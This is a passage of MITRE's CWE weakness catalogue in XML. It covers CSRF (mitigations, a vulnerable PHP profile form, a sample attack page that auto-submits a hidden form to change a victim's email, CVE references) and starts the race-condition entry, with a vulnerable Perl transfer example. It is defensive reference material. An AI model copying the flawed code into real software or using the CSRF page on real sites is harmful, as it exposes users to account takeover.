                  <xhtml:p>Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.</xhtml:p>
                  <xhtml:p>This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]</xhtml:p>
               </Description>
               <Effectiveness_Notes>Note that this can probably be bypassed using XSS (CWE-79), or when using web technologies that enable the attacker to read raw headers from HTTP requests.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Do not use the GET method for any request that triggers a state change.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.</Description>
               <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79). An attacker could use XSS to generate a spoofed Referer, or to generate a malicious request from a page whose Referer would be allowed.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.</Intro_Text>
               <Body_Text>The following HTML is intended to allow a user to update a profile.</Body_Text>
               <Example_Code Nature="Bad" Language="HTML">
                  <xhtml:div>&lt;form action="/url/profile.php" method="post"&gt;<xhtml:br/>&lt;input type="text" name="firstname"/&gt;<xhtml:br/>&lt;input type="text" name="lastname"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="text" name="email"/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Update"/&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>profile.php contains the following code.</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>// initiate the session in order to validate sessions<xhtml:br/>
                     <xhtml:br/>session_start();<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//if the session is registered to a valid user then allow update</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>if (! session_is_registered("username")) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>echo "invalid session detected!";<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// Redirect user to login page</xhtml:i>
                           <xhtml:br/>[...]<xhtml:br/>
                           <xhtml:br/>exit;</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// The user session is valid, so process the request</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// and update the information</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>update_profile();<xhtml:br/>
                     <xhtml:br/>function update_profile {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// read in the data from $POST and send an update</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// to the database</xhtml:i>
                           <xhtml:br/>SendUpdateToDatabase($_SESSION['username'], $_POST['email']);<xhtml:br/>[...]<xhtml:br/>echo "Your profile has been successfully updated.";</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.</Body_Text>
               <Body_Text>The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:</Body_Text>
               <Example_Code Nature="Attack" Language="HTML">
                  <xhtml:div>&lt;SCRIPT&gt;<xhtml:br/>function SendAttack () {<xhtml:div style="margin-left:1em;">form.email = "attacker@example.com";<xhtml:br/>
                        <xhtml:i>// send to profile.php</xhtml:i>
                        <xhtml:br/>form.submit();</xhtml:div>}<xhtml:br/>&lt;/SCRIPT&gt;<xhtml:br/>
                     <xhtml:br/>&lt;BODY onload="javascript:SendAttack();"&gt;<xhtml:br/>
                     <xhtml:br/>&lt;form action="http://victim.example.com/profile.php" id="form" method="post"&gt;<xhtml:br/>&lt;input type="hidden" name="firstname" value="Funny"&gt;<xhtml:br/>&lt;input type="hidden" name="lastname" value="Joke"&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="hidden" name="email"&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.</Body_Text>
               <Body_Text>Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2004-1703</Reference>
               <Description>Add user accounts via a URL in an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1703</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1995</Reference>
               <Description>Add user accounts via a URL in an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1995</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1967</Reference>
               <Description>Arbitrary code execution by specifying the code in a crafted img tag or URL</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1967</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1842</Reference>
               <Description>Gain administrative privileges via a URL in an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1842</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1947</Reference>
               <Description>Delete a victim's information via a URL or an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1947</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2059</Reference>
               <Description>Change another user's settings via a URL or an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2059</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1674</Reference>
               <Description>Perform actions as administrator via a URL or an img tag</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1674</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3520</Reference>
               <Description>modify password for the administrator</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3520</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3022</Reference>
               <Description>CMS allows modification of configuration via CSRF attack against the administrator</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3022</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3759</Reference>
               <Description>web interface allows password changes or stopping a virtual machine via CSRF</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3759</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-Site Request Forgery (CSRF)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A5</Entry_ID>
               <Entry_Name>Cross Site Request Forgery (CSRF)</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>9</Entry_ID>
               <Entry_Name>Cross-site Request Forgery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="111"/>
            <Related_Attack_Pattern CAPEC_ID="462"/>
            <Related_Attack_Pattern CAPEC_ID="467"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and&#xA; Response Splitting).&#34; Page 37"/>
            <Reference External_Reference_ID="REF-329"/>
            <Reference External_Reference_ID="REF-330"/>
            <Reference External_Reference_ID="REF-331"/>
            <Reference External_Reference_ID="REF-332"/>
            <Reference External_Reference_ID="REF-333"/>
            <Reference External_Reference_ID="REF-334"/>
            <Reference External_Reference_ID="REF-335"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-956"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This is a well-known Composite of multiple weaknesses that must all occur simultaneously, although it is attack-oriented in nature.</Rationale>
            <Comments>While attack-oriented composites are supported in CWE, they have not been a focus of research. There is a chance that future research or CWE scope clarifications will change or deprecate them. Perform root-cause analysis to determine if other weaknesses allow CSRF attacks to occur, and map to those weaknesses. For example, predictable CSRF tokens might allow bypass of CSRF protection mechanisms; if this occurs, they might be better characterized as randomness/predictability weaknesses.</Comments>
            <Reasons>
               <Reason Type="Other"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
            </Note>
            <Note Type="Theoretical">
               <xhtml:p>The CSRF topology is multi-channel:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Attacker (as outsider) to intermediary (as user). The interaction point is either an external or internal channel.</xhtml:li>
                  <xhtml:li>Intermediary (as user) to server (as victim). The activation point is an internal channel.</xhtml:li>
               </xhtml:ul>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Likelihood_of_Exploit, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Tom Stracener</Modification_Name>
               <Modification_Date>2009-05-20</Modification_Date>
               <Modification_Comment>Added demonstrative example for profile.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationship_Notes, Research_Gaps</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships, Theoretical_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="362" Name="Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently.</Description>
         <Extended_Description>
            <xhtml:p>This can have security implications when the expected synchronization is in security-critical code, such as recording whether a user is authenticated or modifying important state information that should not be influenced by an outsider.</xhtml:p>
            <xhtml:p>A race condition occurs within concurrent environments, and is effectively a property of a code sequence. Depending on the context, a code sequence may be in the form of a function call, a small number of instructions, a series of program invocations, etc.</xhtml:p>
            <xhtml:p>A race condition violates these properties, which are closely related:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>Exclusivity - the code sequence is given exclusive access to the shared resource, i.e., no other code sequence can modify properties of the shared resource before the original sequence has completed execution.</xhtml:li>
                  <xhtml:li>Atomicity - the code sequence is behaviorally atomic, i.e., no other thread or process can concurrently execute the same sequence of instructions (or a subset) against the same resource.</xhtml:li>
               </xhtml:ul>
            <xhtml:p>A race condition exists when an "interfering code sequence" can still access the shared resource, violating exclusivity. Programmers may assume that certain code sequences execute too quickly to be affected by an interfering code sequence; when they are not, this violates atomicity. For example, the single "x++" statement may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read (the original value of x), followed by a computation (x+1), followed by a write (save the result to x).</xhtml:p>
            <xhtml:p>The interfering code sequence could be "trusted" or "untrusted." A trusted interfering code sequence occurs within the product; it cannot be modified by the attacker, and it can only be invoked indirectly. An untrusted interfering code sequence can be authored directly by the attacker, and typically it is external to the vulnerable product.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="691" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Sometimes"/>
            <Language Name="C++" Prevalence="Sometimes"/>
            <Language Name="Java" Prevalence="Sometimes"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Impact>DoS: Resource Consumption (Other)</Impact>
               <Note>When a race condition makes it possible to bypass a resource cleanup routine or trigger multiple initialization routines, it may lead to resource exhaustion (CWE-400).</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Instability</Impact>
               <Note>When a race condition allows multiple control flows to access a resource simultaneously, it might lead the product(s) into unexpected states, possibly resulting in a crash.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Files or Directories</Impact>
               <Impact>Read Application Data</Impact>
               <Note>When a race condition is combined with predictable resource names and loose permissions, it may be possible for an attacker to overwrite or access confidential data (CWE-59).</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Black box methods may be able to identify evidence of race conditions via methods such as multiple simultaneous connections, which may cause the software to become instable or crash. However, race conditions with very narrow timing windows would not be detectable.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>White Box</Method>
               <Description>Common idioms are detectable in white box analysis, such as time-of-check-time-of-use (TOCTOU) file operations (CWE-367), or double-checked locking (CWE-609).</Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</xhtml:p>
                  <xhtml:p>Race conditions may be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.</xhtml:p>
                  <xhtml:p>Insert breakpoints or delays in between relevant code statements to artificially expand the race window so that it will be easier to detect.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>In languages that support it, use synchronization primitives. Only wrap these around critical code to minimize the impact on performance.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use thread-safe capabilities such as the data access abstraction in Spring.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Minimize the usage of shared resources in order to remove as much complexity as possible from the control flow and to reduce the likelihood of unexpected conditions occurring.</xhtml:p>
                  <xhtml:p>Additionally, this will minimize the amount of synchronization necessary and may even help to reduce the likelihood of a denial of service where an attacker may be able to repeatedly trigger a critical section (CWE-400).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When using multithreading and operating on shared variables, only use thread-safe functions.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use atomic operations on shared variables. Be wary of innocent-looking constructs such as "x++". This may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read, followed by a computation, followed by a write.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use a mutex if available, but be sure to avoid related weaknesses such as CWE-412.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Avoid double-checked locking (CWE-609) and other implementation errors that arise when trying to avoid the overhead of synchronization.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Disable interrupts or signals over critical parts of the code, but also make sure that the code does not go into a large or infinite loop.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use the volatile type modifier for critical variables to avoid unexpected compiler optimization or reordering. This does not necessarily solve the synchronization problem, but it can help.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>This code could be used in an e-commerce application that supports transfers between accounts. It takes the total amount of the transfer, sends it to the new account, and deducts the amount from the original account.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$transfer_amount = GetTransferAmount();<xhtml:br/>$balance = GetBalanceFromDatabase();<xhtml:br/>
                     <xhtml:br/>if ($transfer_amount &lt; 0) {<xhtml:div style="margin-left:1em;">FatalError("Bad Transfer Amount");</xhtml:div>}<xhtml:br/>$newbalance = $balance - $transfer_amount;<xhtml:br/>if (($balance - $transfer_amount) &lt; 0) {<xhtml:div style="margin-left:1em;">FatalError("Insufficient Funds");</xhtml:div>}<xhtml:br/>SendNewBalanceToDatabase($newbalance);<xhtml:br/>NotifyUser("Transfer of $transfer_amount succeeded.");<xhtml:br/>NotifyUser("New balance: $newbalance");</xhtml:div>
               </Example_Code>
               <Body_Text>A race condition could occur between the calls to GetBalanceFromDatabase() and SendNewBalanceToDatabase().</Body_Text>
               <Body_Text>Suppose the balance is initially 100.00. An attack could be constructed as follows:</Body_Text>
